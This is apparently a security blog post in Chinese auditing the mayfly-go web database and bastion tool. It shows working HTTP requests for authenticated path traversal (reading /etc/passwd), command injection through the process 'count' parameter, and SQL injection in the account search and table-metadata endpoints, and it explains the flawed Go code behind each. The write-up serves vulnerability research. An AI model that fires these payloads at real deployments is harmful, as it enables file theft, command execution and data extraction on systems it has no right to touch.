---
title: "mayfly-go审计学习"
date: 2022-10-06T12:00:00+08:00
draft: false
author: "r0fus0d"

---

这个程序我以为是web数据库管理工具，结果还自带堡垒机的功能，后台功能点都使用了一遍，感觉确实不错，配合工具找了几个后台的洞，危害不大.

<!--more-->

---

- https://github.com/may-fly/mayfly-go

---

## 指纹特征

```go
fofa: "mayfly, 后台管理"
```

---

## 后台目录遍历

在后台 运维-机器列表-机器操作-文件 处，点击查看文件

![](../../img/mayfly-go-case/Untitled.png)

正常的请求

```
GET http://10.211.55.3:8888/api/machines/10/files/40/read?fileId=40&path=%2Ftmp%2F&machineId=10 HTTP/1.1
Host: 10.211.55.3:8888
Accept: application/json, text/plain, */*
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjUwODAxMjcsImlkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.qf3LuOfc7-kZYYQVXZ6TSx3CGZLXKhoN_2kG1PUGhyI
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Referer: http://10.211.55.3:8888/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

修改path的值

```
GET /api/machines/10/files/42/read?fileId=42&machineId=10&path=%2Ftmp%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: 10.211.55.3:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.9
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjUwODAxMjcsImlkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.qf3LuOfc7-kZYYQVXZ6TSx3CGZLXKhoN_2kG1PUGhyI
Referer: http://10.211.55.3:8888/
Accept-Encoding: gzip
```

![](../../img/mayfly-go-case/Untitled%201.png)

而path的值直接用 `/etc/passwd` 是不行的,来看看代码

定位到 `server/internal/machine/api/machine_file.go`

```go
func (m *MachineFile) ReadFileContent(rc *ctx.ReqCtx) {
	g := rc.GinCtx
	fid := GetMachineFileId(g)
	readPath := g.Query("path")
	readType := g.Query("type")

	sftpFile := m.MachineFileApp.ReadFile(fid, readPath)
	defer sftpFile.Close()

	fileInfo, _ := sftpFile.Stat()
	// 如果是读取文件内容，则校验文件大小
	if readType != "1" {
		biz.IsTrue(fileInfo.Size() < max_read_size, "文件超过1m，请使用下载查看")
	}

	rc.ReqParam = fmt.Sprintf("path: %s", readPath)
	// 如果读取类型为下载，则下载文件，否则获取文件内容
	if readType == "1" {
		// 截取文件名，如/usr/local/test.java -》 test.java
		path := strings.Split(readPath, "/")
		rc.Download(sftpFile, path[len(path)-1])
	} else {
		datas, err := io.ReadAll(sftpFile)
		biz.ErrIsNilAppendErr(err, "读取文件内容失败: %s")
		rc.ResData = string(datas)
	}
}
```

可以看到，对 path 的内容没有过滤。且当 type=1 时，是作为下载文件流返回的

![](../../img/mayfly-go-case/Untitled%202.png)

那么这个点到底算不算漏洞，我认为是漏洞，但没有危害，因为后台本身就是可以远程连接运维主机的，但参数没有进行过滤也确实是问题所在，所以是漏洞，无实际危害。

---

## 后台命令注入

在后台 运维-机器列表-机器操作-文件 处，点击进程

![](../../img/mayfly-go-case/Untitled%203.png)

看下正常请求包

```
GET http://10.211.55.3:8888/api/machines/10/process?name=&sortType=1&count=10&id=10 HTTP/1.1
Host: 10.211.55.3:8888
Accept: application/json, text/plain, */*
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjUwODAxMjcsImlkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.qf3LuOfc7-kZYYQVXZ6TSx3CGZLXKhoN_2kG1PUGhyI
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Referer: http://10.211.55.3:8888/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

修改下 count 的值

```
GET http://10.211.55.3:8888/api/machines/10/process?name=&sortType=1&count=10%7Cid&id=10 HTTP/1.1
Host: 10.211.55.3:8888
Accept: application/json, text/plain, */*
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjUwODAxMjcsImlkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.qf3LuOfc7-kZYYQVXZ6TSx3CGZLXKhoN_2kG1PUGhyI
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Referer: http://10.211.55.3:8888/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![](../../img/mayfly-go-case/Untitled%204.png)

来看看代码

定位到 `server/internal/machine/api/machine.go`

```go
// 获取进程列表信息
func (m *Machine) GetProcess(rc *ctx.ReqCtx) {
	g := rc.GinCtx
	cmd := "ps -aux "
	sortType := g.Query("sortType")
	if sortType == "2" {
		cmd += "--sort -pmem "
	} else {
		cmd += "--sort -pcpu "
	}

	pname := g.Query("name")
	if pname != "" {
		cmd += fmt.Sprintf("| grep %s ", pname)
	}

	count := g.Query("count")
	if count == "" {
		count = "10"
	}

	cmd += "| head -n " + count

	cli := m.MachineApp.GetCli(GetMachineId(rc.GinCtx))
	biz.ErrIsNilAppendErr(m.ProjectApp.CanAccess(rc.LoginAccount.Id, cli.GetMachine().ProjectId), "%s")

	res, err := cli.Run(cmd)
	biz.ErrIsNilAppendErr(err, "获取进程信息失败: %s")
	rc.ResData = res
}
```

可以看到 count 参数没有进行过滤，拼接到了 cmd 变量的后面，造成了命令注入

这个漏洞和上面那个一样，我认为是漏洞，但危害不大，不过这个命令执行后在后台日志里是看不到的。

---

## 后台sql盲注 1处

在后台-账号管理处进行查询

![](../../img/mayfly-go-case/Untitled%205.png)

看下 poc

```go
GET /api/sys/accounts?username=admin%E9%8E%88%27%22%5C%28 HTTP/1.1
Host: 10.211.55.3:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.9
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjUwODAxMjcsImlkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.qf3LuOfc7-kZYYQVXZ6TSx3CGZLXKhoN_2kG1PUGhyI
Referer: http://10.211.55.3:8888/
Accept-Encoding: gzip
```

测一下，可以跑出来

![](../../img/mayfly-go-case/Untitled%206.png)

定位到代码中看下问题 server/internal/sys/api/account.go

```go
// @router /accounts [get]
func (a *Account) Accounts(rc *ctx.ReqCtx) {
	condition := &entity.Account{}
	condition.Username = rc.GinCtx.Query("username")
	rc.ResData = a.AccountApp.GetPageList(condition, ginx.GetPageParam(rc.GinCtx), new([]vo.AccountManageVO))
}
```

无任何过滤

这个注入影响平台本身，还是有些危害的。

---

## 后台sql盲注 2处

后台 数据操作处

![](../../img/mayfly-go-case/Untitled%207.png)

```
GET /api/dbs/13/t-index?db=mayfly-go&id=13&tableName=t_sys_role_resource%27and%27n%27%3D%27n HTTP/1.1
Host: 10.211.55.3:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.9
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjUwODAxMjcsImlkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.qf3LuOfc7-kZYYQVXZ6TSx3CGZLXKhoN_2kG1PUGhyI
Referer: http://10.211.55.3:8888/
Accept-Encoding: gzip
```

```
GET /api/dbs/13/c-metadata?db=mayfly-go&id=13&tableName=t_sys_role_resource%27and%28select%2Afrom%28select%2Bsleep%280%29%29a%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2B1%29%3D%27 HTTP/1.1
Host: 10.211.55.3:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.9
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjUwODAxMjcsImlkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.qf3LuOfc7-kZYYQVXZ6TSx3CGZLXKhoN_2kG1PUGhyI
Referer: http://10.211.55.3:8888/
Accept-Encoding: gzip
```

![](../../img/mayfly-go-case/Untitled%208.png)

看下2处的代码

```go
func (d *Db) TableIndex(rc *ctx.ReqCtx) {
	tn := rc.GinCtx.Query("tableName")
	biz.NotEmpty(tn, "tableName不能为空")
	rc.ResData = d.DbApp.GetDbInstance(GetIdAndDb(rc.GinCtx)).GetMeta().GetTableIndex(tn)
}

// @router /api/db/:dbId/c-metadata [get]
func (d *Db) ColumnMA(rc *ctx.ReqCtx) {
	g := rc.GinCtx
	tn := g.Query("tableName")
	biz.NotEmpty(tn, "tableName不能为空")

	dbi := d.DbApp.GetDbInstance(GetIdAndDb(rc.GinCtx))
	biz.ErrIsNilAppendErr(d.ProjectApp.CanAccess(rc.LoginAccount.Id, dbi.ProjectId), "%s")
	rc.ResData = dbi.GetMeta().GetColumns(tn)
}
```

都是只校验不为空，无其他过滤

不过这个后台功能点本身就是对添加的数据源进行sql查询，这个注入点也是影响数据源而不是平台本身，也没啥危害。
